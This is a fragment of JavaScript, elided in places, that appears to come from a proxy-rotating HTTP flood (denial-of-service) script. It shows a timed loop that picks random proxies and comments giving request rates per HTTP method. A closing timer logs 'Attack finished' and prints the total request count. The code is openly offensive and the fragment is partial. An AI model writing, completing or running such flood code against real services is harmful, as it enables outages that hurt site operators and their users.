...
var int = setInterval(() => {
    //if (cookie !== '' && ua !== '') {
    var proxykob = proxies[Math.floor(Math.random() * proxies.length)];
    ...
    //DELL/PUT = 21K/81K Req
    //PATCH/HEAD/POST = 1K/10K Req
    //GET = 4K/34K Req
...
setTimeout(() => {
  clearInterval(int);
  log(`Attack finished`);
  console.log("Total Request:"+totals);
  process.exit(1);
}, time * 1000);
